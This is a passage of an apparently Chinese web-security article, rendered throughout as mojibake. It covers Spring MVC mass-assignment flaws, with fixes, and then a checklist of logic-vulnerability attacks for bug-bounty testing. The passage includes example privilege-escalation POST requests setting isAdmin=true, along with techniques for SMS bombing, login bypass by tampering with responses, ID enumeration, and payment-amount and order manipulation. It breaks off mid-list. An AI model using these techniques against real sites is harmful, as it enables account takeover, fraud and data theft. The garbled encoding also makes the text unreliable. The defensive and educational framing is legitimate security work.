é’ˆå¯¹ä¸Šè¿°ä»£ç ï¼Œç»™å‡ºGPTå›ç­” è¿™æ®µJavaä»£ç æ˜¯ä¸€ä¸ªç®€å•çš„Spring MVCæ§åˆ¶å™¨æ–¹æ³•ï¼Œå®ƒå¤„ç†HTTP POSTè¯·æ±‚å¹¶å°†ç”¨æˆ·ä¿¡æ¯ä¿å­˜åˆ°æ•°æ®åº“ä¸­ã€‚è®©æˆ‘ä»¬é€è¡Œæ¥åˆ†æå®ƒï¼š 1. `@RequestMapping(value = \"/addUserInfo\", method = RequestMethod.POST)`: è¿™æ˜¯ä¸€ä¸ªSpring MVCæ³¨è§£ï¼Œç”¨äºå°†HTTPè¯·æ±‚æ˜ å°„åˆ°æ§åˆ¶å™¨æ–¹æ³•ã€‚åœ¨è¿™é‡Œï¼Œå®ƒå°†HTTP POSTè¯·æ±‚æ˜ å°„åˆ°\"/addUserInfo\"è·¯å¾„ï¼Œè¡¨ç¤ºè¯¥æ–¹æ³•å°†å¤„ç†è¯¥è·¯å¾„çš„POSTè¯·æ±‚ã€‚ 2. `public String submit(User user) {`: è¿™æ˜¯æ§åˆ¶å™¨æ–¹æ³•çš„å£°æ˜ï¼Œå®ƒæ¥å—ä¸€ä¸ªåä¸º\"User\"çš„å‚æ•°ã€‚è¿™é‡Œå‡è®¾\"User\"æ˜¯ä¸€ä¸ªJavaç±»ï¼Œç”¨äºè¡¨ç¤ºç”¨æˆ·ä¿¡æ¯ã€‚ 3. `userService.add(user);`: åœ¨è¿™ä¸€è¡Œï¼Œä»£ç è°ƒç”¨ä¸€ä¸ªåä¸º\"userService\"çš„æœåŠ¡ï¼ˆServiceï¼‰ç±»çš„\"add\"æ–¹æ³•ï¼Œå¹¶ä¼ å…¥\"user\"ä½œä¸ºå‚æ•°ã€‚è¿™è¡¨ç¤ºå°†ç”¨æˆ·ä¿¡æ¯ä¿å­˜åˆ°æ•°æ®åº“ä¸­ï¼Œå¯èƒ½æ˜¯ç”±\"userService\"å¤„ç†æ•°æ®æŒä¹…åŒ–çš„æ“ä½œã€‚ 4. `return \"successPage\";`: æœ€åï¼Œæ§åˆ¶å™¨æ–¹æ³•è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²\"successPage\"ã€‚è¿™é€šå¸¸ç”¨äºå°†è¯·æ±‚çš„å¤„ç†ç»“æœè¿”å›ç»™ç”¨æˆ·ï¼Œå‘Šè¯‰ç”¨æˆ·è¯·æ±‚å·²æˆåŠŸå¤„ç†ã€‚åœ¨è¿™é‡Œï¼Œ\"successPage\"å¯èƒ½æ˜¯ä¸€ä¸ªè§†å›¾åç§°ï¼Œå®ƒä¼šè¢«è§£æä¸ºä¸€ä¸ªå®é™…çš„é¡µé¢ï¼Œå±•ç¤ºç»™ç”¨æˆ·ï¼Œç”¨äºç¡®è®¤æ“ä½œå·²æˆåŠŸå®Œæˆã€‚ æ€»ç»“ï¼šè¿™æ®µä»£ç æ˜¯ä¸€ä¸ªç”¨äºå¤„ç†HTTP POSTè¯·æ±‚çš„Spring MVCæ§åˆ¶å™¨æ–¹æ³•ã€‚å®ƒæ¥å—ä¸€ä¸ª\"user\"å¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œå°†ç”¨æˆ·ä¿¡æ¯ä¿å­˜åˆ°æ•°æ®åº“ä¸­ï¼Œå¹¶è¿”å›ä¸€ä¸ªåä¸º\"successPage\"çš„å­—ç¬¦ä¸²ï¼Œç”¨äºå‘ŠçŸ¥ç”¨æˆ·æ“ä½œå·²æˆåŠŸå®Œæˆã€‚å…·ä½“çš„ç”¨æˆ·ä¿¡æ¯ä¿å­˜é€»è¾‘å’Œ\"successPage\"é¡µé¢çš„å±•ç¤ºå–å†³äºä»£ç ä¸­å…¶ä»–éƒ¨åˆ†ï¼Œä¾‹å¦‚\"userService\"ç±»å’Œè§†å›¾è§£æå™¨çš„é…ç½®ã€‚ æ½œåœ¨å±å®³ ç»“åˆä¸Šé¢çš„demoï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œcontrollerå±‚ä½¿ç”¨çš„è‡ªåŠ¨ç»‘å®šå¯¹è±¡çš„æ–¹å¼ï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨äº†postè¯·æ±‚çš„å‚æ•°ç›´æ¥ç»‘å®šåˆ°äº†Userï¼Œè™½ç„¶å‰ç«¯formè¡¨å•ä¸­ä»…å‡ºç°äº†usernameï¼Œphoneï¼Œemailï¼Œä½†æ˜¯å¦‚æœä½¿ç”¨burpç­‰å·¥å…·å‘addUserInfoå‘é€äº† POST /addUserInfo username=daheike&amp;password=bypass&amp;email=test@test.com&amp;isAdmin=true æˆ–è€… POST /addUserInfo username=daheike&amp;password=bypass&amp;email=test@test.com&amp;userid=adminid é‚£ä¹ˆå¦‚æœåç»­ä½¿ç”¨äº†è¢«æ±¡æŸ“çš„å¯¹è±¡çš„è¢«æ±¡æŸ“çš„å±æ€§ï¼Œé‚£ä¹ˆå°±ä¼šäº§ç”Ÿä¸€å®šçš„å®‰å…¨é—®é¢˜ã€‚ è‡ªåŠ¨ç»‘å®šæ¼æ´å¹¶éä»…åœ¨Spring MVCä¸­å¯èƒ½å‡ºç°ï¼Œåªè¦æœ‰è‡ªåŠ¨ç»‘å®šåŠŸèƒ½çš„æ¡†æ¶éƒ½å¯èƒ½å‡ºç°è¿™æ ·çš„é€»è¾‘é—®é¢˜ã€‚ ä½†æ˜¯å¯èƒ½å¯¹äºå¤§éƒ¨åˆ†å®‰å…¨äººå‘˜æ¥è¯´ï¼Œå¯èƒ½é¢å¯¹çš„æ˜¯ä¸€ä¸ªé»‘ç›’çš„ç¯å¢ƒï¼Œå¾ˆéš¾å‘ç°controllerå±‚æˆ–è€…ormæ˜¯å¦å­˜åœ¨è¿™æ ·çš„é—®é¢˜ï¼Œé‚£ä¹ˆå¯èƒ½å°±éœ€è¦å¤šä¸ªè¡¨å•çš„äº¤å‰å¯¹æ¯”ï¼Œæ¨æµ‹å‡ºå¯èƒ½å‡ºç°é—®é¢˜çš„ç‚¹äº†ã€‚ ä¿®å¤å»ºè®® é€šç”¨ä¿®å¤æ–¹æ³•æ˜¯ï¼šé¿å…å°†è¾“å…¥ç›´æ¥ç»‘å®šåˆ°åŸŸå¯¹è±¡ï¼Œåªæœ‰ç”¨æˆ·å¯ä»¥ç¼–è¾‘çš„å­—æ®µæ‰åŒ…å«åœ¨DTOä¸­ã€‚ä»¥ä¸Šæ–‡ä¸­çš„deomä¸ºä¾‹ï¼š public class UserRegistrationFormDTO { private String username; private String password; private String email; //Getters &amp; Setters } æˆ–è€…å¯ä»¥ä¿®æ”¹controllerå±‚ï¼Œä»…æ¥æ”¶ç”¨æˆ·å¯ä»¥ä¿®æ”¹çš„å‚æ•°ï¼š @RequestMapping(value = \"/addUserInfo\", method = RequestMethod.POST) public String submit(String username,String phone,String email) { userService.add(username,phone,email); return \"successPage\"; } ä¹Ÿå¯ä»¥è®¾ç½®ç™½åå•ï¼š @Controller public class UserController { @InitBinder public void initBinder(WebDataBinder binder, WebRequest request) { binder.setDisallowedFields([\"isAdmin\"]); } ... } 3.0 SRCä¸­çš„é€»è¾‘æ¼æ´æ€»ç»“ 1. æ³¨å†Œï¼š çŸ­ä¿¡è½°ç‚¸ éªŒè¯ç å®‰å…¨é—®é¢˜ å¯†ç çˆ†ç ´ é‚®ç®±è½°ç‚¸ 2. ç”¨æˆ·ä»»æ„æ³¨å†Œã€æ‰¹é‡æ³¨å†Œ 3. ç”¨æˆ·åæšä¸¾ 4. XSSï¼ˆæœ‰æ¡†çš„åœ°æ–¹å°±å¯ä»¥å°è¯•æ’XSSï¼‰ 5. ç™»å½•ï¼š çŸ­ä¿¡è½°ç‚¸ã€éªŒè¯ç å®‰å…¨é—®é¢˜ã€å¯†ç çˆ†ç ´ã€é‚®ç®±è½°ç‚¸ SQLæ³¨å…¥ æ’åº“ æŠ“åŒ…æŠŠpasswordå­—æ®µä¿®æ”¹ä¸ºç©ºå€¼å‘é€ è®¤è¯å‡­è¯æ›¿æ¢ã€æ¯”å¦‚è¿”å›çš„æ•°æ®åŒ…ä¸­åŒ…å«è´¦å·ï¼Œä¿®æ”¹è´¦å·å°±èƒ½ç™»å½•åˆ°å…¶ä»–è´¦å· Cookieä»¿å†’ ä¿®æ”¹è¿”å›åŒ…çš„ç›¸å…³æ•°æ®ï¼Œå¯èƒ½ä¼šç™»é™†åˆ°å…¶ä»–çš„ç”¨æˆ· 6. æ‰¾å›å¯†ç ï¼š çŸ­ä¿¡é‚®ç®±è½°ç‚¸ã€çŸ­ä¿¡é‚®ç®±åŠ«æŒ é‡ç½®ä»»æ„ç”¨æˆ·è´¦æˆ·å¯†ç ã€éªŒè¯ç æ‰‹æœºç”¨æˆ·æœªç»Ÿä¸€éªŒè¯ ç›´æ¥è·³è¿‡éªŒè¯æ­¥éª¤ 7. è´­ä¹°æ”¯ä»˜ã€å……å€¼ï¼ˆè¦åˆ©ç”¨æŠ“åŒ…å»ä»”ç»†æŸ¥çœ‹æ¯ä¸€ä¸ªå¯ç”¨çš„å‚æ•°ï¼‰ äº¤æ˜“é‡‘é¢ã€æ•°é‡ä¿®æ”¹ã€æ›´æ¢æ”¯ä»˜æ¨¡å—ï¼ˆæ¯”å¦‚æ›´æ¢æ”¯ä»˜çš„æ¨¡å—é‡‘é¢ï¼‰ äº¤æ˜“ä¿¡æ¯è®¢å•ç¼–ç /å¯¼è‡´ä¿¡æ¯æ³„éœ² æ•´æ•°æº¢å‡ºï¼Œintæœ€å¤§å€¼ä¸º2147483647ï¼Œè¶…è¿‡æœ€å¤§å€¼ ä¿®æ”¹å……å€¼è´¦æˆ· æ”¯ä»˜ç»•è¿‡ 8. æŠ½å¥–æ´»åŠ¨ åˆ·å¥–å“ã€ç§¯åˆ† å¹¶å‘ 9. ä¼˜æƒ å·ã€ä»£é‡‘å· å¹¶å‘é€»è¾‘æ¼æ´ï¼ˆburpæ‰¹é‡è·å–ä¼˜æƒ åˆ¸ï¼‰ ä¿®æ”¹ä¼˜æƒ åˆ¸é‡‘é¢ã€æ•°é‡ 10. è®¢å•ä¿¡æ¯ è®¢å•ä¿¡æ¯éå†ã€æ³„éœ² è®¢å•ä¿¡æ¯æ³„éœ²å¯¼è‡´ç”¨æˆ·ä¿¡æ¯æ³„éœ² åˆ å‡ºä»–äººè®¢å• 11. ä¼šå‘˜ç³»ç»Ÿ ä¿®æ”¹ä¸ªäººä¿¡æ¯ä¸Šä¼ æ–‡ä»¶ï¼Œä¸Šä¼ å¸¦å¼¹çª—çš„html å¦‚é‡ä¸Šä¸Šä¼ xlsxã€docxï¼Œå¯èƒ½å­˜åœ¨XXEï¼Œä¸Šä¼ æ¶æ„çš„æ–‡æ¡£ç›²æµ‹ å›¾ç‰‡ä¸Šä¼ ä¹Ÿå¯èƒ½é‡åˆ°imagereagickå‘½ä»¤æ‰§è¡Œï¼Œä¸Šä¼ æ¶æ„å›¾ç‰‡ è§†é¢‘ä¸Šä¼ å¦‚æœä½¿ç”¨ffmpeg&lt;3.2.4ï¼ˆè§†é¢‘æŒ‰å¸§åˆ†å‰²æˆå›¾ç‰‡ï¼‰ï¼Œä¸Šä¼ æ¶æ„aviç›²æµ‹ssrf ç”¨æˆ·æ¨ªå‘è¶Šæƒè®¿é—®ã€éå†ã€å¯¼è‡´ç”¨æˆ·ä¿¡æ¯æ³„éœ² SQLæ³¨å…¥ã€ä¸ªäººç®€å†å¤„å­˜å‚¨XSSä¸ªäººä¿¡æ¯æ³¨å†Œçš„åç§°ä¹Ÿå¯ä»¥æ’å…¥XSS 12. ä¼ è¾“è¿‡ç¨‹ æ˜æ–‡ä¼ è¾“è´¦æˆ·å¯†ç  ä¿®æ”¹ä¿¡æ¯å¤„æ— session/tokenå¯¼è‡´csrf POST/COOKIEæ³¨å…¥ 13. è¯„è®º POSTæ³¨å…¥ å­˜å‚¨å‹XSS æ— session/tokenå¯¼è‡´CSRF 1. éªŒè¯ç é—®é¢˜ ä¸‡èƒ½éªŒè¯ç  è¿”å›åŒ…ä¸­å­˜åœ¨éªŒè¯ç  åˆ é™¤éªŒè¯ç æˆ–è€…cookieä¸­çš„å€¼å¯ä»¥çˆ†ç ´è´¦å·å¯†ç  2. çŸ­ä¿¡è½°ç‚¸ ä¸€ç›´é‡æ”¾ åˆ é™¤ä¿®æ”¹cookieï¼Œé‡æ”¾æ•°æ®åŒ… éå†å‚æ•°å‘é€æ•°æ®åŒ… æ‰‹æœºå·åé¢åŠ ç©ºæ ¼æˆ–è€…å‰é¢åŠ å…¶ä»–çš„æ¯”å¦‚+86æˆ–è€…é€—å·åˆ†å·ç­‰ï¼Œç„¶åé‡å‘æ•°æ®åŒ… è¯·æ±‚å‚æ•°ä¿®æ”¹å¤§å°å†™ï¼Œæˆ–è€…æ·»åŠ è¯·æ±‚å‚æ•°æ¯”å¦‚&amp;id=1 ä¸€ä¸ªç«™çš„ç™»å½•å¤„å¯èƒ½åšäº†é˜²æŠ¤ï¼Œä½†æ˜¯å†æ‰¾å›å¯†ç å¤„å¯èƒ½æ²¡æœ‰å®‰å…¨é˜²æŠ¤ï¼Œæˆ–è€…åœ¨æ³¨å†Œæµç¨‹ä¸­æ²¡æœ‰å®‰å…¨é˜²æŠ¤ï¼Œæ‰€ä»¥è¯´å¤šæµ‹è¯•æ¥å£ å¦‚æœå¯¹æ‰‹æœºå·ä¸€å¤©çš„æ¬¡æ•°è¿›è¡Œäº†é™åˆ¶ï¼Œè¿˜å¯ä»¥å†å‘ä¸€æ¬¡çŸ­ä¿¡ï¼ŒDO interceptä¹‹åä¿®æ”¹ä¸ºæˆåŠŸå›æ˜¾ 3. æ°´å¹³è¶Šæƒ ä¸»è¦ç™»é™†åè¿˜æ˜¯ä¿®æ”¹å‚æ•°ï¼Œä¸»è¦æ‰¾åˆ°å¤šä¸ªæ¥å£ä¸æ–­æµ‹è¯• å…³æ³¨ç½‘é¡µæºä»£ç ï¼Œæœ‰æ—¶å€™ä¼šæœ‰è¡¨å•ï¼Œä½†è¢«biddenï¼ˆéšè—æ ‡ç­¾ï¼‰ç»™éšè—èµ·æ¥äº†ï¼Œå¯ä»¥ä¿®æ”¹è¿”å›åŒ…ç„¶åå°è¯•è·å–æ•°æ®æ£€æµ‹ å¤šä¸ªè´¦å·ï¼Œä¸»è¦åˆ†æè¯·æ±‚å‚æ•° 4. æ•°æ®æ³„éœ² å†æ‰¾å›å¯†ç å¤„ï¼Œå¡«å†™æ•°æ®åæŠ“åŒ…æŸ¥çœ‹è¿”å›ä¿¡æ¯ï¼Œæœ‰å¯èƒ½å­˜åœ¨æ•æ„Ÿæ•°æ®è¿”å› 5. ä»»æ„ç”¨æˆ·å¯†ç é‡ç½® ç›®å‰å¤§éƒ¨åˆ†éƒ½æ˜¯åœ¨ä¿®æ”¹å¯†ç å¤„å‚æ•°ä¿®æ”¹ æœ‰äº›æ˜¯å‰ç«¯éªŒè¯ æ”¯ä»˜é€»è¾‘æ¼æ´ 1. è¾¹ç•Œå€¼é—®é¢˜ : æ­£å¸¸çš„é€»è¾‘æ˜¯ç”¨æˆ·è´­ä¹°å•†å“ï¼Œç„¶åä»·æ ¼ç´¯åŠ å¾—åˆ°ä¸€ä¸ªæ€»ä»·è¿›è¡Œæ‰£æ¬¾ã€‚è¿™ä¸ªæ—¶å€™å°±ä¼šäº§ç”Ÿé€»è¾‘é—®é¢˜ï¼šå¦‚æœè¯´ç”¨æˆ·è´­ä¹°çš„å•†å“æ˜¯è´Ÿæ•°äº†ï¼Œé‚£ä¹ˆè®¡ç®—çš„æ€»æ•°å°±æ˜¯è´Ÿæ•°ã€‚åè¿‡æ¥é’±ç»™ç”¨æˆ· 2. é¡ºåºæ‰§è¡Œç¼ºé™·ï¼šæ­£å¸¸çš„é€»è¾‘æ˜¯a-b-c-d å¾ªç¯æ¸è¿›çš„è¿›è¡Œæµç¨‹æ“ä½œã€‚è¿™ä¸ªæ—¶å€™å°±ä¼šäº§ç”Ÿé€»è¾‘é—®é¢˜ï¼šå¯ä»¥ç›´æ¥ä»ä¸­ç»•è¿‡æŸä¸€ä¸ªè¿‡ç¨‹è¿›å…¥åˆ°ä¸‹ä¸€æ­¥æ“ä½œã€‚å¦‚æœè¯´æœ‰ä¸€é¡¹æ˜¯æ”¯ä»˜çš„æ“ä½œï¼Œé‚£ä¹ˆä¹Ÿå°±ä¼šäº§ç”Ÿæ”¯ä»˜ç»•è¿‡ï¼Œå¦‚æœè¯´æœ‰ä¸€é¡¹æ˜¯éªŒè¯æœºåˆ¶ï¼Œå°±ä¼šç»•è¿‡éªŒè¯ç›´æ¥è¿›å…¥ä¸‹ä¸€æ­¥ã€‚ 3. é‡‘é¢ç›´æ¥ä¼ è¾“å¯¼è‡´ç¯¡æ”¹ï¼šç›´æ¥å¯¹ä¸‹å•çš„é‡‘é¢è¿›è¡Œä¿®æ”¹å€¼ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨fdæˆ–è€…burpæŠ“åŒ… 4. ç¡®å®šæ”¯ä»˜ä¹‹åè¿˜å¯ä»¥åŠ å…¥è´­ç‰©è½¦ï¼šæŠŠå•†å“æ”¾å…¥è´­ç‰©è½¦ç‚¹å‡»ä¸‹å•æ”¯ä»˜ï¼Œä¼šè·³è½¬åˆ°å¾®ä¿¡ï¼Œæ”¯ä»˜å®ç­‰ç¬¬ä¸‰æ–¹æ”¯ä»˜å¹³å°ã€‚è¿™ä¸ªæ—¶å€™è¿˜å¯ä»¥ç»§ç»­åœ¨è´­ç‰©è½¦ä¸­åŠ å…¥å•†å“ï¼Œæ”¯ä»˜ç»“æŸä¹‹åï¼Œå•†å®¶å‘æ”¾çš„å•†å“æ˜¯ç°åœ¨çš„è´­ç‰©è½¦é‡Œé¢çš„ä¸œè¥¿ã€‚ 5. è¯·æ±‚é‡æ”¾ï¼šè´­ä¹°æˆåŠŸä¹‹åï¼Œç»§ç»­é‡æ”¾è¯·æ±‚ï¼Œå¯ä»¥è®©è´­ä¹°çš„å•†å“ä¸€ç›´å¢åŠ ã€‚è´­ä¹°æˆåŠŸä¹‹åï¼Œä¼šæœ‰ä¸€ä¸ªé“¶è¡Œå¯¹å•†æˆ·ç½‘ç«™è·³è½¬çš„è¿‡ç¨‹ï¼Œå¦‚æœåå¤è¿›è¡Œæ“ä½œï¼Œæœ‰å‡ ç‡ä¼šå¯¼è‡´å•†å“åå¤è´­ä¹°å’Œå¢åŠ ï¼Œä½†æ˜¯ä¸éœ€è¦ä»˜æ›´å¤šçš„é’±ã€‚ 6. è¯·æ±‚å‚æ•°å¹²æ‰°ï¼šé‡‘é’±åšäº†ç­¾åè®¤è¯ä¹‹åï¼Œä¿®æ”¹åä¸é€šè¿‡ï¼Œä½†æ˜¯åœ¨é‡Œé¢ä»ç„¶ä¼šæœ‰ä¸€ä¸ªå‚æ•°å¯¹é‡‘é¢äº§ç”Ÿå½±å“å¯¼è‡´é—®é¢˜äº§ç”Ÿã€‚ 7. è®¢å•æ›¿æ¢ï¼šè®¢å•æ›¿æ¢å‘ç”Ÿåœ¨æ”¯ä»˜ä¹‹åçš„äº‹ä»¶å¤„ç†ï¼ŒåŒæ—¶å‘æœåŠ¡å™¨å‘èµ·äºŒæ¬¡æ”¯ä»˜è¯·æ±‚ä¸€ä¸ªå¤šä¸€ä¸ªå°‘ï¼Œæ”¯ä»˜é‡‘é¢å°‘çš„ï¼Œç„¶åæ”¯ä»˜ä¹‹åè¿›è¡Œæ›¿æ¢ï¼Œå‘ŠçŸ¥æœåŠ¡å™¨è®¢å•æ”¯ä»˜å®Œæˆï¼Œå¹¶ä¸”è¿‡ç¨‹å¯ä»¥åå¤çš„å›æ”¾ã€‚ 8. æ¬ºè¯ˆ:éœ€è¦ä¸¤ä¸ªæ”¶æ¬¾äººï¼Œä¸€ä¸ªæ˜¯æ­£å¸¸çš„å•†å®¶ï¼Œä¸€ä¸ªæ˜¯ä¼ªé€ çš„å•†å®¶ 9. å•ä½æ›¿æ¢ï¼šäº§ç”Ÿåœ¨paypalç±»ä¼¼çš„å›½é™…æ”¯ä»˜çš„åœºæ™¯ã€‚ 10. ç”¨æˆ·æ›¿æ¢ï¼šåœ¨æ”¯ä»˜è¿‡ç¨‹ä¸­å‘ç”Ÿç”¨æˆ·æ›¿æ¢ç°è±¡ï¼Œé¦–å…ˆç™»é™†è‡ªå·±çš„è´¦æˆ·ï¼Œç„¶åå–å¾—å¦å¤–ä¸€ä¸ªäººçš„è´¦æˆ·åç­‰æœ‰æ•ˆä¿¡æ¯ï¼Œåœ¨ä¸šåŠ¡æµç¨‹ä¸­ç”¨å¯¹æ–¹çš„ç”¨æˆ·åæ›¿æ¢è‡ªå·±çš„ç”¨æˆ·åï¼Œç”¨å¯¹æ–¹çš„ä½™é¢è´­ä¹°å®Œæˆåï¼Œå†æ›¿æ¢è‡ªå·±çš„è´¦æˆ·åï¼Œè¿™æ ·å°±å½¢æˆåˆ«äººçš„é’±ä¹°è‡ªå·±çš„ä¸œè¥¿ 11. å¼ºåˆ¶æ”»å‡»ï¼šå¼ºåˆ¶æ”»å‡»å‘ç”Ÿåœ¨æš´åŠ›ç ´è§£çš„æƒ…å†µä¸‹ï¼Œå¦‚æœä¸€ä¸ªå•†å®¶è¿ç”¨ä¸€ä¸ªè‡ªå·±çš„ç½‘åº—ï¼Œæ¥å…¥ç¬¬ä¸‰æ–¹æ”¯ä»˜æ¥å£ï¼Œç”±äºè®¾è®¡ä¸Šçš„ä¸å½“å¯¼è‡´å•†å®¶ä¸ç¬¬ä¸‰æ–¹æ”¯ä»˜çº¦å®šçš„å¯†é’¥Keyå¯ä»¥å•ç‹¬è¢«MD5åŠ å¯†ï¼Œå¯¼è‡´å¯ä»¥ä½¿ç”¨MD5ç¢°æ’æŠ€æœ¯å¯¹å¯†é’¥è¿›è¡Œç ´è§£ï¼Œæ”»å‡»è€…å¯ä»¥è®¾è®¡ç®€å•çš„å¯†é’¥åŠ å¯†ä¿¡æ¯ä½¿å¾—MD5åŠ å¯†æ˜¯å¯ä»¥ç”¨MD5ç¢°æ’æŠ€æœ¯è¿›è¡Œæš´åŠ›ç ´è§£ã€‚ 12. ç§˜é’¥æ³„æ¼ï¼šå†…ç½®æ”¯ä»˜åŠŸèƒ½çš„appä¸ºäº†è®¾è®¡ä¸Šçš„æ–¹ä¾¿æœ‰å¯èƒ½ä¼šæŠŠMd5æˆ–è€…æ˜¯RSAçš„ç§é’¥æ³„æ¼å¯¼è‡´æ”»å‡»è€…åç¼–è¯‘apkä¹‹åè·å–å¯†é’¥ä¿¡æ¯ä½¿å¾—äº¤æ˜“ä¿¡æ¯å¯ä»¥è¢«ç¯¡æ”¹ã€‚ 13. å‡½æ•°ä¿®æ”¹ï¼šapkåç¼–è¯‘ä¹‹åçš„å‡½æ•°ä¿®æ”¹ï¼Œå¯èƒ½å¯¼è‡´å•†å®¶åœ¨æœ€åä¸€æ­¥å‘æ”¯ä»˜æ–¹æäº¤è®¢å•æ—¶æœªéªŒè¯ä¿¡æ¯çš„å‡†ç¡®æ€§ï¼Œä»ç„¶è¢«ç¯¡æ”¹ã€‚ 14. heart bleedï¼šSSLï¼ˆå®‰å…¨å¥—æ¥å±‚ï¼‰åè®®æ˜¯ä½¿ç”¨æœ€ä¸ºæ™®éç½‘ç«™åŠ å¯†æŠ€æœ¯ï¼Œè€ŒOpenSSLåˆ™æ˜¯å¼€æºçš„ SSL å¥—ä»¶ï¼Œä¸ºå…¨çƒæˆåƒä¸Šä¸‡çš„webæœåŠ¡å™¨æ‰€ä½¿ç”¨ã€‚WebæœåŠ¡å™¨æ­£æ˜¯é€šè¿‡å®ƒæ¥å°†å¯†é’¥å‘é€ç»™è®¿å®¢ç„¶ååœ¨åŒæ–¹çš„è¿æ¥ä¹‹é—´å¯¹ä¿¡æ¯è¿›è¡ŒåŠ å¯†ã€‚URLä¸­ä½¿ç”¨ httpsæ‰“å¤´çš„è¿æ¥éƒ½é‡‡ç”¨äº†SSLåŠ å¯†æŠ€æœ¯ã€‚åœ¨çº¿è´­ç‰©ã€ç½‘é“¶ç­‰æ´»åŠ¨å‡é‡‡ç”¨SSLæŠ€æœ¯æ¥é˜²æ­¢çªƒå¯†åŠé¿å…ä¸­é—´äººæ”»å‡»ã€‚ è¯¥æ¼æ´è¢«å½’ä¸ºç¼“å†²è¿‡åº¦è¯»å–ã€‚ç¼“å†²è¿‡åº¦è¯»å–é”™è¯¯æ˜¯è½¯ä»¶å¯ä»¥è¯»å–æ¯”åº”è¯¥è¢«å…è®¸è¿˜å¤šçš„æ•°æ®ã€‚æ¼æ´è®©ç‰¹å®šç‰ˆæœ¬çš„openSSLæˆä¸ºæ— éœ€é’¥åŒ™å³å¯å¼€å¯çš„â€œåºŸé”â€ï¼Œå…¥ä¾µè€…æ¯æ¬¡å¯ä»¥ç¿»æ£€æˆ·ä¸»çš„64Kä¿¡æ¯ï¼Œåªè¦æœ‰è¶³å¤Ÿçš„è€å¿ƒå’Œæ—¶é—´ï¼Œå°±å¯ä»¥ç¿»æ£€è¶³å¤Ÿå¤šçš„æ•°æ®ï¼Œæ‹¼å‡‘å‡ºæˆ·ä¸»çš„é“¶è¡Œå¯†ç ã€ç§ä¿¡ç­‰æ•æ„Ÿæ•°æ®ã€‚äº§ç”ŸåŸå› ï¼šæ•°æ®åœ¨ä¼ è¾“çš„ä¸¤ç«¯æ˜¯ä¸åŠ å¯†çš„ã€‚ä¸€äº›æ•°æ®å¦‚æœåœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ä¸åŠ å¯†åˆ™ä¼šæ³„éœ²ä¸ªäººæ•°æ®ç­‰ä¿¡æ¯ã€‚ 1. ä¿®æ”¹è¿”å›åŒ…çš„è¶Šæƒ ä¿®æ”¹æ‰‹æœºå· ä¸€èˆ¬çš„é€»è¾‘ä¸ºï¼šè®¤è¯åŸæ‰‹æœºå·-&gt; å¡«å†™æ–°æ‰‹æœºå·-&gt; æäº¤ä¿®æ”¹ å¦‚æœåœ¨ä¸‹ä¸€æ­¥æ“ä½œæ—¶ï¼Œæ²¡æœ‰æ ¡éªŒä¸Šä¸€æ­¥çš„è®¤è¯æ˜¯å¦æˆåŠŸæ—¶ï¼Œå°±ä¼šå­˜åœ¨é€»è¾‘ç¼ºé™·ç»•è¿‡ æ¯”å¦‚åœ¨è¿›è¡Œç¬¬ä¸€æ­¥è®¤è¯åŸæ‰‹æœºå·æ—¶ï¼Œéšæ„è¾“å…¥éªŒè¯ç ï¼Œå°†responseåŒ…ä¸­çš„ç›¸å…³å­—æ®µè¿›è¡Œä¿®æ”¹ï¼Œæ¯”å¦‚0æ”¹æˆ1ï¼Œfalseæ”¹æˆtrueï¼Œå³å¯ç»•è¿‡ç¬¬ä¸€æ­¥éªŒè¯ï¼Œè¿›å…¥å¡«å†™æ–°æ‰‹æœºå·ç•Œé¢ï¼Œå¦‚æœç¬¬ä¸‰æ­¥æäº¤ä¿®æ”¹æ—¶æ²¡æœ‰éªŒè¯ç¬¬ä¸€æ­¥çš„ç»“æœï¼Œå°±ä¼šé€ æˆé€»è¾‘æ¼æ´ 2. ç™»å½•ç»•è¿‡ éƒ¨åˆ†ç½‘ç«™çš„èº«ä»½éªŒè¯æ”¾åœ¨äº†å‰ç«¯ï¼Œå› æ­¤åªéœ€è¦å°†responseåŒ…ä¸­çš„ç›¸å…³å­—æ®µè¿›è¡Œä¿®æ”¹ï¼Œæ¯”å¦‚0æ”¹æˆ1ï¼Œfalseæ”¹æˆtrueï¼Œå°±å¯ä»¥ç™»å½•ä»»æ„ç”¨æˆ·è´¦å· 3. æ°´å¹³è¶Šæƒ éå†ID åœ¨ä¸€äº›è¯·æ±‚ä¸­ï¼ŒGETå’ŒPOSTä¸­æœ‰æ˜æ˜¾çš„IDæ•°å­—å‚æ•°ï¼ˆæ‰‹æœºå·ã€å‘˜å·¥å·ã€è´¦å•å·ã€é“¶è¡Œå¡å·ã€è®¢å•å·ç­‰ç­‰ï¼‰ï¼Œå¯ä»¥å°è¯•è¿›è¡Œéå†ï¼Œå¦‚æœç¨‹åºæ²¡æœ‰å¯¹å½“å‰æƒé™è¿›è¡Œåˆ¤æ–­ï¼Œå°±ä¼šå­˜åœ¨æ°´å¹³è¶Šæƒé—®é¢˜ 4. IDæ›¿æ¢ å¦‚æœç¨‹åºå¯¹ç”¨æˆ·æ ‡è¯†è¿›è¡Œäº†hashæˆ–è€…åŠ å¯†ï¼Œè€Œæ— æ³•ç ´è§£ç”¨çš„ä»€ä¹ˆæ–¹å¼çš„è¯ï¼Œå°±æ— æ³•é€šè¿‡éå†IDæ¥è·å–å…¶å®ƒç”¨æˆ·çš„ä¿¡æ¯äº†ï¼Œæ­¤æ—¶å¯ä»¥å°è¯•æ³¨å†Œä¸¤ä¸ªè´¦å·ï¼Œé€šè¿‡æ›¿æ¢ä¸¤ä¸ªIDåŠ å¯†åçš„å€¼ï¼Œåˆ¤æ–­ç¨‹åºæ˜¯å¦å¯¹æƒé™è¿›è¡Œäº†éªŒè¯ï¼Œå¦‚æœæ²¡æœ‰ï¼Œä¹Ÿä¼šå­˜åœ¨è¶Šæƒé—®é¢˜ 5. å‚ç›´è¶Šæƒ 